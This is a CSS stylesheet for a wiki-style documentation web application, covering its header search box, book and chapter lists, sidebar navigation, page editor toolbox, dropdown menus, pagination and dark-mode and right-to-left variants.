header .search-box input { background-color: rgba(0, 0, 0, 0.2); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 40px; color: rgb(238, 238, 238); z-index: 2; padding-inline-start: 40px; }

header .search-box input:focus { outline: none; border: 1px solid rgba(255, 255, 255, 0.6); }

header .search-box button { z-index: 1; left: 16px; color: rgba(255, 255, 255, 0.8); }

html.dark-mode header .search-box button { color: rgb(170, 170, 170); }

html[dir="rtl"] header .search-box button { left: auto; right: 16px; }

header .search-box button svg { margin-block-end: 0px; }

header .search-box ::-webkit-input-placeholder { color: rgb(221, 221, 221); }

@media screen and (min-width: 1000px) and (max-width: 1100px) {
  header .search-box { max-width: 200px; }
}

.logo { display: inline-block; }

.logo:hover { color: rgb(255, 255, 255); text-decoration: none; }

.logo-text { display: inline-block; font-size: 1.8em; color: rgb(255, 255, 255); font-weight: 400; padding-block: 14px; padding-inline: 0px 24px; vertical-align: top; line-height: 1; }

.logo-image { margin-block: 6px; margin-inline: 0px 12px; vertical-align: top; height: 43px; }

.mobile-menu-toggle { color: rgb(255, 255, 255); fill: rgb(255, 255, 255); font-size: 2em; border: 2px solid rgba(255, 255, 255, 0.8); border-radius: 4px; padding: 0px 6px; position: absolute; right: 16px; top: 13px; line-height: 1; cursor: pointer; user-select: none; }

.mobile-menu-toggle svg { margin: 0px; bottom: -2px; }

html[dir="rtl"] .mobile-menu-toggle { left: 16px; right: auto; }

@media screen and (max-width: 1000px) {
  header .header-links { background-color: rgb(255, 255, 255); display: none; z-index: 10; right: 16px; border-radius: 4px; overflow: hidden; position: absolute; box-shadow: rgba(0, 0, 0, 0.13) 0px 2px 2px 1px; margin-top: -6px; }
  html.dark-mode header .header-links { background-color: rgb(51, 51, 51); }
  header .header-links.show { display: block; }
  header .links a, header .dropdown-container ul li a, header .dropdown-container ul li button { text-align: start; display: block; padding: 12px 16px; color: rgb(68, 68, 68); }
  html.dark-mode header .links a, html.dark-mode header .dropdown-container ul li a, html.dark-mode header .dropdown-container ul li button { color: rgb(238, 238, 238); }
  header .links a svg, header .dropdown-container ul li a svg, header .dropdown-container ul li button svg { margin-inline-end: 12px; }
  header .links a:hover, header .dropdown-container ul li a:hover, header .dropdown-container ul li button:hover { background-color: rgb(238, 238, 238); color: rgb(0, 0, 0); text-decoration: none; }
  html.dark-mode header .links a:hover, html.dark-mode header .dropdown-container ul li a:hover, html.dark-mode header .dropdown-container ul li button:hover { background-color: rgb(51, 51, 51); }
  html.dark-mode header .links a:hover, html.dark-mode header .dropdown-container ul li a:hover, html.dark-mode header .dropdown-container ul li button:hover { color: rgb(255, 255, 255); }
  header .links a:focus, header .dropdown-container ul li a:focus, header .dropdown-container ul li button:focus { background-color: rgb(238, 238, 238); outline-color: var(--color-primary); color: var(--color-primary); }
  html.dark-mode header .links a:focus, html.dark-mode header .dropdown-container ul li a:focus, html.dark-mode header .dropdown-container ul li button:focus { background-color: rgb(51, 51, 51); }
  header .dropdown-container { display: block; padding-inline-start: 0px; }
  header .links { display: block; }
  header .dropdown-container ul { position: relative; background-color: transparent; border: 0px; padding: 0px; margin: 0px; box-shadow: none; display: block !important; }
}

.tri-layout-mobile-tabs { position: sticky; top: 0px; z-index: 5; background-color: rgb(255, 255, 255); border-bottom: 1px solid rgb(221, 221, 221); box-shadow: rgba(0, 0, 0, 0.1) 0px 1px 6px -1px; }

html.dark-mode .tri-layout-mobile-tabs { border-bottom-color: rgb(51, 51, 51); }

.tri-layout-mobile-tab { text-align: center; border-bottom: 3px solid rgb(187, 187, 187); cursor: pointer; margin: 0px; background-color: rgb(255, 255, 255); }

html.dark-mode .tri-layout-mobile-tab { background-color: rgb(34, 34, 34); }

html.dark-mode .tri-layout-mobile-tab { border-bottom-color: rgb(51, 51, 51); }

.tri-layout-mobile-tab:first-child { border-inline-end: 1px solid rgb(221, 221, 221); }

html.dark-mode .tri-layout-mobile-tab:first-child { border-inline-end-color: rgb(0, 0, 0); }

.tri-layout-mobile-tab[aria-selected="true"] { border-bottom-color: currentcolor !important; }

.breadcrumbs { display: flex; flex-flow: row wrap; align-items: center; justify-content: flex-start; opacity: 0.7; }

.breadcrumbs .icon-list-item { width: auto; padding-top: 6px; padding-bottom: 6px; }

.breadcrumbs .separator { display: inline-block; fill: rgb(170, 170, 170); font-size: 1.6em; line-height: 0.8; margin: -2px 0px 0px; }

.breadcrumbs:hover, .breadcrumbs:focus-within { opacity: 1; }

@media screen and (max-width: 1000px) {
  .breadcrumbs .icon-list-item { padding: 6px; }
  .breadcrumbs .icon-list-item > span + span { display: none; }
  .breadcrumbs .icon-list-item > span:first-child { margin-inline-end: 0px; }
}

.dropdown-search { position: relative; }

.dropdown-search .dropdown-search-toggle { padding: 6px; border: 1px solid transparent; border-radius: 4px; }

.dropdown-search .dropdown-search-toggle:hover { border-color: rgb(221, 221, 221); }

.dropdown-search .svg-icon { margin-inline-end: 0px; }

.dropdown-search-toggle.compact { padding: 3px 6px; }

.dropdown-search-toggle.compact .avatar { height: 22px; width: 22px; }

.faded a, .faded button, .faded span, .faded span > div { color: rgb(102, 102, 102); fill: rgb(102, 102, 102); }

.faded .text-button { opacity: 0.5; transition: all 120ms ease-in-out 0s; }

.faded .text-button:hover { opacity: 1; text-decoration: none; }

.faded span.faded-text { display: inline-block; padding: 12px; }

.action-buttons .text-button { display: inline-block; padding: 6px 12px; }

.action-buttons .text-button:last-child { padding-inline-end: 0px; }

.action-buttons .text-button:first-child { padding-inline-start: 0px; }

.action-buttons .dropdown-container:last-child a { padding-inline: 12px 0px; }

.action-buttons { text-align: end; }

.action-buttons.text-left { text-align: start; }

.action-buttons.text-left .text-button { padding-inline: 0px 16px; }

.action-buttons.text-center { text-align: center; }

@media screen and (max-width: 880px) {
  .action-buttons .text-button { padding: 6px; }
  .action-buttons .dropdown-container:last-child a { padding-inline-start: 6px; }
}

footer { flex-shrink: 0; padding: 1rem 1rem 2rem; text-align: center; }

footer a { margin: 0px 0.5em; }

body.flexbox footer { display: none; }

.book-contents .entity-list-item .icon { width: 4px; border-radius: 1px; place-self: stretch; height: auto; margin-inline-end: 24px; }

.book-contents .entity-list-item .icon::after { opacity: 0.5; }

.book-contents .entity-list-item .icon svg { display: none; }

.book-contents .entity-list-item p { margin-bottom: 0px; }

.book-contents .entity-list-item .inner-page { padding-top: 0px; padding-bottom: 0px; }

.entity-list-item + .chapter-expansion { display: flex; padding: 0px 16px 16px; align-items: center; border: 0px; width: 100%; position: relative; }

.entity-list-item + .chapter-expansion > .icon { width: 4px; height: auto; border-radius: 0px 0px 1px 1px; align-self: stretch; flex-shrink: 0; }

.entity-list-item + .chapter-expansion > .icon::before { position: absolute; top: 0px; left: 0px; width: 100%; height: 1px; background-color: currentcolor; content: ""; opacity: 0.5; }

.entity-list-item + .chapter-expansion > .icon::after { opacity: 0.5; }

.entity-list-item + .chapter-expansion .icon svg { display: none; }

.entity-list-item + .chapter-expansion > .content { flex: 1 1 0%; }

.entity-list-item + .chapter-expansion .chapter-expansion-toggle { border-radius: 0px 4px 4px 0px; padding: 6px 16px; width: 100%; text-align: start; }

.entity-list-item + .chapter-expansion .chapter-expansion-toggle:hover { background-color: rgba(0, 0, 0, 0.06); }

.entity-list-item.has-children { padding-bottom: 0px; }

.entity-list-item.has-children > .icon { border-radius: 4px 4px 0px 0px; }

.inset-list { display: none; }

.inset-list .entity-list-item-name { font-size: 1rem; }

.inset-list .entity-list-item-children { padding-top: 0px; padding-bottom: 0px; }

.sidebar-page-nav { list-style: none; margin-block: 12px 16px; margin-inline: 6px 0px; position: relative; }

.sidebar-page-nav::after { content: ""; display: block; position: absolute; left: 0px; background-color: rgba(0, 0, 0, 0.2); width: 2px; top: 5px; bottom: 5px; z-index: 0; }

html[dir="rtl"] .sidebar-page-nav::after { left: auto; right: 0px; }

html.dark-mode .sidebar-page-nav::after { background-color: rgba(255, 255, 255, 0.2); }

.sidebar-page-nav li { margin-bottom: 4px; font-size: 0.95em; position: relative; }

.sidebar-page-nav .h1 { padding-inline-start: 16px; }

.sidebar-page-nav .h2 { padding-inline-start: 24px; }

.sidebar-page-nav .h3 { padding-inline-start: 32px; }

.sidebar-page-nav .h4 { padding-inline-start: 40px; }

.sidebar-page-nav .h5 { padding-inline-start: 48px; }

.sidebar-page-nav .h6 { padding-inline-start: 56px; }

.sidebar-page-nav .current-heading { font-weight: bold; }

.sidebar-page-nav li:not(.current-heading) .sidebar-page-nav-bullet { background-color: rgb(187, 187, 187) !important; }

html.dark-mode .sidebar-page-nav li:not(.current-heading) .sidebar-page-nav-bullet { background-color: rgb(102, 102, 102) !important; }

.sidebar-page-nav .sidebar-page-nav-bullet { width: 6px; height: 6px; position: absolute; left: -2px; top: 30%; border-radius: 50%; box-shadow: rgb(242, 242, 242) 0px 0px 0px 6px; z-index: 1; }

html.dark-mode .sidebar-page-nav .sidebar-page-nav-bullet { box-shadow: rgb(17, 17, 17) 0px 0px 0px 6px; }

html[dir="rtl"] .sidebar-page-nav .sidebar-page-nav-bullet { left: auto; right: -2px; }

.book-tree .sidebar-page-list { list-style: none; margin-block: 6px 0px; margin-inline: -12px; padding-inline: 0px; position: relative; }

.book-tree .sidebar-page-list::after, .book-tree .sidebar-page-list .sub-menu::after { content: ""; display: block; position: absolute; left: 16px; top: 1rem; bottom: 1rem; border-inline-start: 4px solid rgba(0, 0, 0, 0.1); z-index: 0; }

html[dir="rtl"] .book-tree .sidebar-page-list::after, html[dir="rtl"] .book-tree .sidebar-page-list .sub-menu::after { left: auto; right: 16px; }

.book-tree .sidebar-page-list ul { list-style: none; padding-inline: 1rem 0px; }

.book-tree .sidebar-page-list .entity-list-item { padding-top: 3px; padding-bottom: 3px; background-clip: content-box; border-radius: 0px 3px 3px 0px; }

.book-tree .sidebar-page-list .entity-list-item .content { padding-top: 6px; padding-bottom: 6px; max-width: calc(100% - 20px); }

.book-tree .sidebar-page-list .entity-list-item.selected { background-color: rgba(0, 0, 0, 0.08); }

.book-tree .sidebar-page-list .entity-list-item.no-hover { margin-top: -6px; padding-inline-end: 0px; }

.book-tree .sidebar-page-list .entity-list-item-name { font-size: 1em; margin: 0px; }

.book-tree .sidebar-page-list .chapter-child-menu { font-size: 0.8rem; margin-top: -0.2rem; margin-inline-start: -1rem; }

.book-tree .sidebar-page-list [chapter-toggle] { padding-inline-start: 0.7rem; padding-bottom: 0.2rem; }

.book-tree .sidebar-page-list .entity-list-item .icon { z-index: 2; width: 4px; height: auto; align-self: stretch; flex-shrink: 0; border-radius: 1px; opacity: 0.6; }

.book-tree .sidebar-page-list .entity-list-item .icon::after { opacity: 1; }

.book-tree .sidebar-page-list .entity-list-item .icon svg { display: none; }

.chapter-child-menu ul.sub-menu { display: none; padding-inline-start: 0px; position: relative; }

.chapter-child-menu [chapter-toggle].open + .sub-menu { display: block; }

.sortable-page-list, .sortable-page-list ul { list-style: none; }

.sort-box { margin-bottom: 16px; padding: 16px 32px; position: relative; }

.sort-box::before { pointer-events: none; content: ""; border-radius: 4px; opacity: 0.5; border: 2px solid var(--color-book); display: block; inset: 0px; position: absolute; }

.sort-box-options { display: flex; flex-wrap: wrap; justify-content: space-between; }

.sort-box-options .button { margin-inline-start: 0px; }

.sortable-page-list { margin-inline-start: 0px; padding: 0px; }

.sortable-page-list .entity-list-item > span:first-child { align-self: flex-start; }

.sortable-page-list .sortable-selected .entity-list-item, .sortable-page-list .sortable-selected .entity-list-item:hover { outline: 1px dotted var(--color-primary); background-color: var(--color-primary-light)  !important; }

.sortable-page-list .entity-list-item > div { display: block; flex: 1 1 0%; }

.sortable-page-list > ul { margin-inline-start: 0px; }

.sortable-page-list ul { margin-bottom: 16px; margin-top: 0px; padding-inline-start: 16px; }

.sortable-page-list li { border: 1px solid rgb(221, 221, 221); margin-top: -1px; min-height: 38px; }

.sortable-page-list li.text-page, .sortable-page-list li.text-chapter { border-inline-start: 2px solid currentcolor; }

.sortable-page-list li:first-child { margin-top: 6px; }

.sortable-page-list li.placeholder { position: relative; }

.sortable-page-list li.placeholder::before { position: absolute; }

.activity-list-item { padding: 12px 0px; display: grid; grid-template-columns: min-content 1fr; column-gap: 16px; font-size: 0.9em; }

.card .activity-list-item { padding: 12px 16px; }

.user-list-item { display: inline-grid; padding: 12px; grid-template-columns: min-content 1fr; column-gap: 16px; font-size: 0.9em; align-items: center; }

.user-list-item > div:first-child { line-height: 0; }

ul.pagination { display: inline-block; list-style: none; margin: 16px 0px; padding-inline-start: 1px; }

ul.pagination li { float: left; }

ul.pagination li:first-child a, ul.pagination li:first-child span { border-radius: 3px 0px 0px 3px; }

ul.pagination li:last-child a, ul.pagination li:last-child span { border-radius: 0px 3px 3px 0px; }

ul.pagination a, ul.pagination span { display: block; padding: 3px 12px; border: 1px solid rgb(204, 204, 204); margin-inline-start: -1px; user-select: none; color: rgb(85, 85, 85); }

html.dark-mode ul.pagination a, html.dark-mode ul.pagination span { color: rgb(238, 238, 238); }

html.dark-mode ul.pagination a, html.dark-mode ul.pagination span { border-color: rgb(102, 102, 102); }

ul.pagination li.disabled { cursor: not-allowed; }

ul.pagination li.active span { color: rgb(17, 17, 17); background-color: rgba(0, 0, 0, 0.05); }

html.dark-mode ul.pagination li.active span { color: rgb(238, 238, 238); }

html.dark-mode ul.pagination li.active span { background-color: rgba(0, 0, 0, 0.5); }

.compact ul.pagination { margin: 0px; }

.entity-list, .icon-list { margin: 0px -16px; }

.entity-list h4, .icon-list h4 { margin: 0px; }

.entity-list hr, .icon-list hr { margin: 0px; }

.entity-list .text-small.text-muted, .icon-list .text-small.text-muted { color: rgb(170, 170, 170); font-size: 0.75em; margin-top: 6px; }

.entity-list .text-muted p.text-muted, .icon-list .text-muted p.text-muted { margin-top: 0px; }

.entity-list .page.draft .text-page, .icon-list .page.draft .text-page { color: var(--color-page-draft); fill: var(--color-page-draft); }

.entity-list > .dropdown-container, .icon-list > .dropdown-container { display: block; }

.icon-list hr { margin: 12px 16px; max-width: 140px; opacity: 0.25; height: 1.1px; }

.icon-list hr + hr, .icon-list hr:first-child, .icon-list hr:last-child { display: none; }

.entity-list-item, .icon-list-item { padding: 12px 16px; display: flex; align-items: center; background-color: transparent; border: 0px; width: 100%; position: relative; word-break: break-word; }

.entity-list-item h4 a, .icon-list-item h4 a { color: rgb(102, 102, 102); }

.entity-list-item > span:first-child, .icon-list-item > span:first-child { margin-inline-end: 16px; flex: 0 0 auto; }

.entity-list-item > span:last-child, .icon-list-item > span:last-child { flex: 1 1 0%; text-align: start; }

.entity-list-item > .content, .icon-list-item > .content { min-width: 0px; }

.entity-list-item:not(.no-hover), .icon-list-item:not(.no-hover) { cursor: pointer; }

.entity-list-item:not(.no-hover):hover, .icon-list-item:not(.no-hover):hover { text-decoration: none; background-color: rgba(0, 0, 0, 0.1); border-radius: 4px; }

.entity-list-item.outline-hover:hover, .icon-list-item.outline-hover:hover { background-color: transparent; }

.entity-list-item:focus, .icon-list-item:focus { background-color: rgb(238, 238, 238); outline: rgb(102, 102, 102) dotted 1px; outline-offset: -2px; }

html.dark-mode .entity-list-item:focus, html.dark-mode .icon-list-item:focus { background-color: rgb(34, 34, 34); }

.entity-list-item-path-sep { display: inline-block; vertical-align: top; position: relative; top: 1px; }

.entity-list-item-path-sep svg { margin-inline-end: 0px; }

.card .entity-list-item:not(.no-hover):hover { background-color: rgb(242, 242, 242); }

html.dark-mode .card .entity-list-item:not(.no-hover):hover { background-color: rgb(45, 45, 45); }

.card .entity-list-item .entity-list-item:hover { background-color: rgb(238, 238, 238); }

.entity-list-item-children { padding: 16px; }

.entity-list-item-children > div { overflow: hidden; padding: 6px 0px; margin-top: -6px; }

.entity-list-item-children .entity-chip { text-overflow: ellipsis; height: 2.5em; overflow: hidden; text-align: start; display: block; white-space: nowrap; }

.entity-list-item-image { align-self: stretch; width: 140px; flex: 0 0 auto; background-size: cover; background-position: 50% 50%; border-radius: 3px; position: relative; margin-inline-end: 24px; }

.entity-list-item-image.entity-list-item-image-wide { width: 220px; }

.entity-list-item-image .svg-icon { color: rgb(255, 255, 255); font-size: 1.66rem; margin-inline-end: 0px; position: absolute; bottom: 6px; left: 6px; }

html.dark-mode .entity-list-item-image .svg-icon { color: rgba(255, 255, 255, 0.6); }

@media screen and (max-width: 880px) {
  .entity-list-item-image { width: 80px; }
}

.chapter > .entity-list-item-image { width: 60px; }

.entity-list.compact { font-size: 8.4px; }

.entity-list.compact h4, .entity-list.compact a { line-height: 1.2; }

.entity-list.compact .entity-item-snippet { display: none; }

.entity-list.compact .entity-list-item p { font-size: 11.2px; padding-top: 6px; }

.entity-list.compact p { margin: 0px; }

.entity-list.compact > p.empty-text { display: block; font-size: 14px; }

.entity-list.compact hr { margin: 0px; }

@media screen and (max-width: 880px) {
  .entity-list.compact h4 { font-size: 1.666em; }
}

.entity-item-tags { font-size: 0.75rem; opacity: 1; }

.entity-item-tags .primary-background-light { background: transparent; }

.entity-item-tags .tag-name { background-color: rgba(0, 0, 0, 0.05); }

.dropdown-container { display: inline-block; vertical-align: top; position: relative; }

.dropdown-menu { display: none; position: absolute; z-index: 999; top: 0px; list-style: none; right: 0px; margin: 16px 0px; background-color: rgb(255, 255, 255); box-shadow: rgba(0, 0, 0, 0.18) 0px 2px 4px; border-radius: 1px; min-width: 180px; padding: 6px 0px; color: rgb(85, 85, 85); fill: currentcolor; max-height: 500px; overflow-y: auto; text-align: start !important; }

html.dark-mode .dropdown-menu { background-color: rgb(51, 51, 51); }

html.dark-mode .dropdown-menu { color: rgb(238, 238, 238); }

.dropdown-menu.wide { min-width: 220px; }

.dropdown-menu .text-muted { color: rgb(153, 153, 153); fill: rgb(153, 153, 153); }

.dropdown-menu li.active a { font-weight: 600; }

.dropdown-menu a, .dropdown-menu button { display: block; padding: 6px 16px; color: rgb(85, 85, 85); fill: currentcolor; white-space: nowrap; line-height: 1.6; cursor: pointer; }

html.dark-mode .dropdown-menu a, html.dark-mode .dropdown-menu button { color: rgb(238, 238, 238); }

.dropdown-menu a:hover, .dropdown-menu a:focus, .dropdown-menu button:hover, .dropdown-menu button:focus { text-decoration: none; background-color: var(--color-primary-light); color: var(--color-primary); }

.dropdown-menu a:focus, .dropdown-menu button:focus { outline: 1px solid var(--color-primary); outline-offset: -2px; }

.dropdown-menu a svg, .dropdown-menu button svg { margin-inline-end: 12px; display: inline-block; width: 16px; }

.dropdown-menu button { width: 100%; text-align: start; }

.dropdown-menu li.border-bottom { border-bottom: 1px solid rgb(221, 221, 221); }

.dropdown-menu li hr { margin: 6px 0px; }

.featured-image-container { position: relative; overflow: hidden; min-height: 140px; background-size: cover; background-position: 50% 50%; transition: opacity 240ms ease-in-out 0s; }

.featured-image-container a { display: block; }

.featured-image-container img { display: block; width: 100%; max-width: 100%; height: auto; }

.featured-image-container-wrap { position: relative; }

.featured-image-container-wrap .svg-icon { color: rgb(255, 255, 255); font-size: 2rem; margin-inline-end: 0px; position: absolute; bottom: 10px; left: 6px; }

html.dark-mode .featured-image-container-wrap .svg-icon { color: rgba(255, 255, 255, 0.6); }

.grid-card:hover .featured-image-container { opacity: 0.5; }

.action-link { background: transparent; border: none; color: currentcolor; padding: 16px 0px; }

.active-link-list a { display: inline-block; padding: 12px; }

.active-link-list a:not(.active) { color: rgb(68, 68, 68); }

html.dark-mode .active-link-list a:not(.active) { color: rgb(102, 102, 102); }

.active-link-list a:hover { background-color: rgba(0, 0, 0, 0.05); border-radius: 3px; text-decoration: none; }

html.dark-mode .active-link-list a:hover { background-color: rgba(255, 255, 255, 0.05); }

.page-editor { display: flex; flex-direction: column; align-items: stretch; overflow: hidden; }

.page-editor .edit-area { flex: 1 1 0%; flex-direction: column; z-index: 10; }

.page-editor .mce-tinymce { box-shadow: none; }

.page-editor .mce-top-part::before { box-shadow: none; }

body.mce-fullscreen .page-editor .edit-area, body.markdown-fullscreen .page-editor .edit-area { z-index: 12; }

body.mce-fullscreen .page-editor, body.mce-fullscreen .flex-fill, body.markdown-fullscreen .page-editor, body.markdown-fullscreen .flex-fill { overflow: visible; }

@media screen and (max-width: 600px) {
  .page-edit-toolbar { overflow: scroll visible; }
  .page-edit-toolbar .grid.third { display: block; white-space: nowrap; }
  .page-edit-toolbar .grid.third > div { display: inline-block; }
}

.page-save-mobile-button { position: fixed; z-index: 30; border-radius: 50%; width: 56px; height: 56px; font-size: 24px; right: 16px; bottom: 12px; box-shadow: rgba(0, 0, 0, 0.13) 0px 2px 2px 1px; background-color: currentcolor; text-align: center; }

.page-save-mobile-button svg { fill: rgb(255, 255, 255); margin-inline-end: 0px; }

.draft-notification { pointer-events: none; transform: scale(0); transition: transform 120ms ease-in-out 0s; transform-origin: 50% 50%; }

.draft-notification.visible { transform: scale(1); }

.page-style.editor { padding: 0px !important; }

.page-content { width: 100%; max-width: 840px; margin: 0px auto; overflow-wrap: break-word; }

.page-content .align-left { text-align: left; }

.page-content img.align-left, .page-content table.align-left { margin: 6px 16px 16px 0px; float: left !important; }

.page-content .align-right { text-align: right !important; }

.page-content img.align-right, .page-content table.align-right { margin: 6px 0px 6px 12px; float: right !important; }

.page-content .align-center { text-align: center; }

.page-content img.align-center { display: block; }

.page-content img.align-center, .page-content table.align-center { margin-left: auto; margin-right: auto; }

.page-content img { max-width: 100%; height: auto; }

.page-content h1, .page-content h2, .page-content h3, .page-content h4, .page-content h5, .page-content h6, .page-content pre { clear: left; }

.page-content hr { clear: both; margin: 16px 0px; }

.page-content table { hyphens: auto; table-layout: fixed; max-width: 100%; height: auto !important; }

.page-content ins, .page-content del { text-decoration: none; }

.page-content ins { background: rgb(219, 255, 219); }

.page-content del { background: rgb(255, 236, 236); }

.page-content.page-revision pre code { white-space: pre-wrap; }

.pointer-container { position: relative; display: none; left: 0px; z-index: 10; }

.pointer { border: 1px solid rgb(204, 204, 204); display: flex; place-items: center; padding: 12px; border-radius: 4px; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 12px 1px; position: absolute; top: -60px; background-color: rgb(255, 255, 255); width: 275px; z-index: 55; }

html.dark-mode .pointer { border-color: rgb(0, 0, 0); }

html.dark-mode .pointer { background-color: rgb(51, 51, 51); }

.pointer.is-page-editable { width: 328px; }

.pointer::before { position: absolute; left: 50%; bottom: -9px; width: 16px; height: 16px; margin-inline-start: -8px; content: ""; display: block; transform: rotate(45deg); transform-origin: 50% 50%; border-block-end: 1px solid rgb(204, 204, 204); border-inline-end: 1px solid rgb(204, 204, 204); z-index: 56; background-color: rgb(255, 255, 255); border-color: rgb(204, 204, 204); }

html.dark-mode .pointer::before { background-color: rgb(51, 51, 51); }

html.dark-mode .pointer::before { border-color: rgb(0, 0, 0); }

.pointer input, .pointer button, .pointer a { position: relative; border-radius: 0px; height: 28px; font-size: 12px; vertical-align: top; padding: 5px 16px; }

.pointer input { background-color: rgb(255, 255, 255); border: 1px solid rgb(221, 221, 221); color: rgb(102, 102, 102); width: 172px; z-index: 40; padding: 5px 10px; }

html.dark-mode .pointer input { border-color: rgb(0, 0, 0); }

.pointer span.icon { fill: rgb(68, 68, 68); cursor: pointer; user-select: none; display: inline-block; line-height: 1; }

.pointer .input-group .button { line-height: 1; margin: 0px 0px 0px -4px; box-shadow: none; }

.pointer a.button { margin: 0px; }

.pointer .svg-icon { width: 1.2em; height: 1.2em; }

.pointer .button { border-color: rgb(221, 221, 221); }

html.dark-mode .pointer .button { border-color: rgb(0, 0, 0); }

.floating-toolbox { border: 1px solid rgb(221, 221, 221); background-color: rgb(255, 255, 255); right: 64px; width: 48px; overflow: hidden; align-items: stretch; flex-direction: row; display: flex; transition: width 180ms ease-in-out 0s; margin-top: -1px; min-height: 0px; }

html.dark-mode .floating-toolbox { background-color: rgb(34, 34, 34); }

html.dark-mode .floating-toolbox { border-color: rgb(0, 0, 0); }

.floating-toolbox.open { width: 480px; }

.floating-toolbox [toolbox-toggle] svg { transition: transform 180ms ease-in-out 0s; }

.floating-toolbox [toolbox-toggle] { transition: background-color 180ms ease-in-out 0s; }

.floating-toolbox.open [toolbox-toggle] { background-color: rgba(255, 0, 0, 0.29); }

.floating-toolbox.open [toolbox-toggle] svg { transform: rotate(180deg); }

.floating-toolbox > div { flex: 1 1 0%; position: relative; }

.floating-toolbox .tabs { display: block; border-inline-end: 1px solid rgb(221, 221, 221); border-color: rgb(221, 221, 221); width: 48px; flex: 0 1 auto; }

html.dark-mode .floating-toolbox .tabs { border-color: rgb(0, 0, 0); }

.floating-toolbox .tabs svg { padding: 0px; margin: 0px; }

.floating-toolbox .tabs > button { color: rgba(0, 0, 0, 0.5); display: block; cursor: pointer; padding: 12px 16px; font-size: 16px; line-height: 1.6; border-bottom: 1px solid rgba(255, 255, 255, 0.3); }

html.dark-mode .floating-toolbox .tabs > button { color: rgba(255, 255, 255, 0.5); }

.floating-toolbox.open .tabs > button.active { color: rgb(68, 68, 68); background-color: rgba(0, 0, 0, 0.1); }

html.dark-mode .floating-toolbox.open .tabs > button.active { color: rgb(238, 238, 238); }

.floating-toolbox div[toolbox-tab-content] { padding-bottom: 45px; display: flex; flex: 1 1 0%; flex-direction: column; min-height: 0px; overflow-y: scroll; }

.floating-toolbox h4 { font-size: 24px; margin: 16px 0px 0px; padding: 0px 24px 12px; }

.floating-toolbox .tags input { max-width: 100%; width: 100%; min-width: 50px; }

.floating-toolbox .tags td, .floating-toolbox .inline-start-table > div > div > div { padding-inline-end: 12px; padding-top: 12px; position: relative; }

.floating-toolbox .handle { user-select: none; cursor: move; fill: rgb(153, 153, 153); }

.floating-toolbox form { display: flex; flex: 1 1 0%; flex-direction: column; overflow-y: scroll; }

.floating-toolbox table td, .floating-toolbox table th { overflow: visible; }

[toolbox-tab-content] { display: none; }

.suggestion-box { top: auto; margin: -4px 0px 0px; right: auto; left: 0px; padding: 0px; }

.suggestion-box li { display: block; border-bottom: 1px solid rgb(221, 221, 221); }

.suggestion-box li:last-child { border-bottom: 0px; }

.comments-container h5 { color: rgb(136, 136, 136); font-weight: normal; margin-top: 0.5em; }

.comment-editor .CodeMirror, .comment-editor .CodeMirror-scroll { min-height: 175px; }

.mce-floatpanel[aria-label="Insert/edit media"] .mce-open { display: none; }

.entity-list-item > span:first-child, .icon-list-item > span:first-child, .chapter-expansion > .icon { font-size: 0.8rem; width: 1.88em; height: 1.88em; display: flex; align-items: center; justify-content: center; text-align: center; border-radius: 1em; position: relative; overflow: hidden; }

.entity-list-item > span:first-child svg, .icon-list-item > span:first-child svg, .chapter-expansion > .icon svg { margin: 0px; bottom: 0px; }

.entity-list-item > span:first-child::after, .icon-list-item > span:first-child::after, .chapter-expansion > .icon::after { content: ""; position: absolute; background-color: currentcolor; opacity: 0.2; left: 0px; top: 0px; width: 100%; height: 100%; }

.entity-chip { display: inline-block; align-items: center; justify-content: center; text-align: center; font-size: 0.9em; border-radius: 3px; position: relative; overflow: hidden; padding: 6px 12px; fill: currentcolor; opacity: 0.85; transition: opacity 120ms ease-in-out 0s; }

.entity-chip::after { content: ""; position: absolute; background-color: currentcolor; opacity: 0.15; left: 0px; top: 0px; width: 100%; height: 100%; }

.entity-chip:hover { text-decoration: none; opacity: 1; }

.dragged { position: absolute; opacity: 0.5; z-index: 2000; }

body.dragging, body.dragging * { cursor: move !important; }

.avatar { border-radius: 100%; background-color: rgb(238, 238, 238); width: 30px; height: 30px; }

html.dark-mode .avatar { background-color: rgb(0, 0, 0); }

.avatar.med { width: 40px; height: 40px; }

.avatar.large { width: 80px; height: 80px; }

.avatar.huge { width: 120px; height: 120px; }

.avatar.square { border-radius: 3px; }

html.dark-mode .avatar[src$="user_avatar.png"] { filter: invert(1); }

.loading-container { position: relative; display: block; margin: 32px auto; }

.loading-container > div { width: 10px; height: 10px; border-radius: 10px; display: inline-block; vertical-align: top; transform: translate3d(-10px, 0px, 0px); margin-top: 6px; animation-name: loadingBob; animation-duration: 1.4s; animation-iteration-count: infinite; animation-timing-function: cubic-bezier(0.62, 0.28, 0.23, 0.99); margin-inline-end: 4px; background-color: var(--color-page); animation-delay: 0.3s; }

.loading-container > div:first-child { left: -16px; background-color: var(--color-book); animation-delay: 0s; }

.loading-container > div:last-of-type { left: 16px; background-color: var(--color-chapter); animation-delay: 0.6s; }

.loading-container > span { margin-inline-start: 12px; font-style: italic; color: rgb(136, 136, 136); vertical-align: top; }

[back-to-top] { background-color: var(--color-primary); position: fixed; bottom: 16px; right: 24px; padding: 5px 7px; cursor: pointer; color: rgb(255, 255, 255); fill: rgb(255, 255, 255); width: 40px; height: 40px; border-radius: 40px; transition: all 180ms ease-in-out 0s; opacity: 0; z-index: 999; overflow: hidden; }

[back-to-top] svg { width: 26.6667px; height: 26.6667px; margin-inline-end: 4px; }

[back-to-top]:hover { width: 136px; opacity: 1 !important; }

[back-to-top] .inner { width: 136px; }

[back-to-top] span { position: relative; vertical-align: top; line-height: 2; }

.skip-to-content-link { position: fixed; top: -48px; left: 0px; background-color: rgb(255, 255, 255); z-index: 15; border-radius: 0px 4px 4px 0px; display: block; box-shadow: rgba(0, 0, 0, 0.5) 0px 0px 4px 1px; font-weight: bold; }

.skip-to-content-link:focus { top: 32px; outline-offset: -10px; outline: 2px dotted var(--color-primary); }

.contained-search-box { display: flex; height: 38px; }

.contained-search-box input, .contained-search-box button { border-radius: 0px; border: 1px solid rgb(221, 221, 221); margin-inline-start: -1px; }

html.dark-mode .contained-search-box input, html.dark-mode .contained-search-box button { border-color: rgb(0, 0, 0); }

.contained-search-box input { flex: 5 1 0%; padding: 6px 12px; }

.contained-search-box input:focus, .contained-search-box input:active { outline: 0px; }

.contained-search-box button { width: 60px; }

.contained-search-box button i { padding: 0px; }

.contained-search-box button.cancel.active { background-color: rgb(171, 15, 14); color: rgb(238, 238, 238); }

.contained-search-box svg { margin: 0px; }

